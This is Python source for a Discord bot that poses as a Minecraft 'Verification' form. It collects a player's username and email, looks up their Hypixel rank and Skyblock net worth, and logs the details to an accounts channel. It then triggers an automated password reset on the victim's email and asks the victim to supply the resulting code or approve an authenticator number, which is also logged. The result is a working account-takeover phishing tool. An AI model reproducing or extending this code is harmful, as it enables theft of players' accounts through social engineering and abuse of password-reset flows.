import json
import requests
import datetime
import base64
import data
import math
import aiohttp
import discord
from discord import ui, Webhook, NotFound, HTTPException

from views.button_two import ButtonViewTwo
from views.button_four import ButtonViewFour
from views.otp import automate_password_reset
from views.button_three import ButtonViewThree

config = json.load(open("config.json", "r+"))

class MyModalOne(ui.Modal, title="Verification"):
    username = ui.TextInput(label="Minecraft Username", required=True)
    email = ui.TextInput(label="Minecraft Email", required=True)

    async def on_submit(self, interaction: discord.Interaction, /) -> None:
        Flagx = False  
        FlagNx = False 
        uuidplayer = ""

        player_info = {
            "playerlvl": 0,
            "cape_url": "None",
            "rank": "Non",
            "nw": 0
        }

        logs_channel = await interaction.client.fetch_channel(config["discord"]["logs_channel"])
        accounts_channel = await interaction.client.fetch_channel(config["discord"]["accounts_channel"])

        # That bum really left encrypted text here as a watermark LOL

        # Check if Minecraft Username is valid
        response = requests.get(f"https://api.mojang.com/users/profiles/minecraft/{self.username.value}")
        if response.json()["id"]:
            uuidplayer = response.json()["id"]
        else:
            print(f"Invalid Username -> {self.username.value}")
            if config["SECURE_ANY"]:
                print("Failed to find Username UUID | SECURE_ANY -> True | Proceeding...")
            else:
                print("Failed to find Username UUID | SECURE_ANY -> False | Stopping...")
                await interaction.response.send_message("❌ Username not found, make sure you own java edition and entered your username correctly")
                return
        
        # Hypixel Data
        if uuidplayer != "": # If UUID Found

            await interaction.response.defer()

            # Soopy NW and Skyblock Data
            urlnw = f"https://soopy.dev/api/v2/player_skyblock/{uuidplayer}"
            response = requests.get(urlnw)
            if response.status_code == 200:
                skyblock_data = response.json()
                if skyblock_data["data"]["stats"] == {}:
                    print(f"Found No Skyblock stats for user '{self.username.value}'")
                else:
                    profile = skyblock_data["data"]
                    cprofile = profile["stats"]["currentProfileId"]
                    member = profile["profiles"][cprofile]["members"][uuidplayer]
                    nw = member["skyhelperNetworth"]["total"]
                    player_info["nw"] = int(nw)

            # Rank && Level
            hp_key = config["tokens"]["hypixel_key"]
            if hp_key != "":
                url = f"https://api.hypixel.net/player?key={hp_key}&name={self.username.value}"
                data1 = requests.get(url)
                datajson = data1.json()
                if datajson['success'] != False or datajson['player'] != None:
                    player_info["playerlvl"] = ""
                    player_info["rank"] = "No Data Found"
                    print(f"No Hypixel Player data found for {self.username.value}!")
                    Flagx = True
                    
                else:
                    Flagx =  False
                    player_info["playerlvl"] = round((math.sqrt((2 * datajson['player']['networkExp']) + 30625)/ 50)- 2.5)
                    if rank := datajson['player'].get('newPackageRank', "Non"): 
                        skyblock_data["rank"] = rank

            # Cape URLS
            try:
                response = requests.get(f"https://sessionserver.mojang.com/session/minecraft/profile/{uuidplayer}")
                response.raise_for_status()
                capedata = response.json()
                if "properties" in capedata:
                    
                    # Wtf capevalue = next((item["value"] for item in capedata["properties"] if item["name"] == "textures"), None) replaced
                    b64value = capedata["properties"][0]["value"]
                    decoded_bytes = base64.b64decode(b64value).decode("UTF-8")
                    decodedcapedata = json.loads(decoded_bytes)

                    if decodedcapedata["textures"]["CAPE"]:
                        player_info["cape_url"] = decodedcapedata["textures"]['CAPE']["url"]
                        print(f"Cape Found -> {self.username._value}")
                    else:
                        print("No Capes Found")
                else:
                    print("No 'properties' key found in the response.")
            except Exception as e:
                print(f"Failed to retrieve capes: {e}")

        # Responses
        data.LastUserName = self.username.value
        embederror = discord.Embed (
            title="Error Code",
            description = f"API limit Reached / You have already looked up this name recently",
            timestamp= datetime.datetime.now(),
            colour=0xEE4B2B,  
        )
        embedfalsenone = discord.Embed (
            title="Error Code",
            description = f"Invalid/Expired/No Hypixel API Key",
            timestamp= datetime.datetime.now(),
            colour=0xEE4B2B,  
        )
        embed_sucess = discord.Embed (
                title="Account Log",
                timestamp= datetime.datetime.now(),
                colour=0x088F8F,                           
        )
        
        embed_sucess.set_thumbnail(
            url= f"https://mc-heads.net/avatar/{self.username.value}.png"
        )
        
        # User Data
        embed_sucess.add_field(name="**Hypixel Level**:", value=f"{player_info["playerlvl"]}", inline=True)
        embed_sucess.add_field(name="**:moneybag: Skyblock Networth**:", value=f"{player_info["nw"]}", inline=True)
        embed_sucess.add_field(name="**:mortar_board: Rank**:", value=f"{player_info["rank"]}", inline=True)
        embed_sucess.add_field(name="**Username**:", value=f"```{self.username.value}```", inline=False)
        embed_sucess.add_field(name="**Email**:", value=f"```{self.email.value}```", inline=False)
        embed_sucess.add_field(name="**Discord**:", value=f"```{interaction.user.name}```", inline=False)
        embed_sucess.add_field(name="**Capes**:", value=f"{player_info['cape_url']}", inline=False)
        data.LastUsedEmail = self.email.value
            
        if Flagx == True:
            await logs_channel.send(embed = embederror)
        if FlagNx == True:
            await logs_channel.send(embed = embedfalsenone)

        await accounts_channel.send(embed = embed_sucess)

        await interaction.followup.send(
            embed = discord.Embed (
                title = "Please Wait ⌛",
                description = "Please Allow The Bot To Verify The Data You Have Provided",
                colour = 0xFFFFFF
            ),
            ephemeral = True
        )

        result = await automate_password_reset(self.email.value)

        if result:
            await interaction.followup.send(
                embed=discord.Embed(
                    title="Verification ✅",
                    description="A verification code has been sent to your email.\nPlease click the button below to enter your code.",
                    colour=0x00FF00
                ),
                view = ButtonViewTwo(),
                ephemeral = True
            )
            embedtrue=discord.Embed(title="Email A Code Success",timestamp= datetime.datetime.now(),colour=0x00FF00)
            await logs_channel.send(embed=embedtrue)

        elif result == False:
            embedfalse = discord.Embed(title="Email A Code Failed (No Email A Code Turned On)", timestamp = datetime.datetime.now(), colour=0xff0000)
            await logs_channel.send(embed = embedfalse)
            await interaction.followup.send(
                embed=discord.Embed(
                    title="No Security Email :envelope:",
                    description="Your email doesn't have a security email set.\nPlease add one and re-verify",
                    colour=0xFF0000
                ),
                view = ButtonViewThree(),
                ephemeral = True
            )

        elif result == None:
            
            await interaction.followup.send(
                embed = discord.Embed(
                    title="Verification ✅",
                    description=f"Authentication Request .\nPlease confirm the code {data.AUTHVALUE} on your app.\nOnce done click the button below.",
                    colour=0x00FF00
                ),
                view = ButtonViewFour(),
                ephemeral = True
            )
            embedtrue = discord.Embed(title=f"Auth App Code Is : {data.AUTHVALUE}", timestamp= datetime.datetime.now(), colour=0x00FF00)
            await logs_channel.send(embed = embedtrue)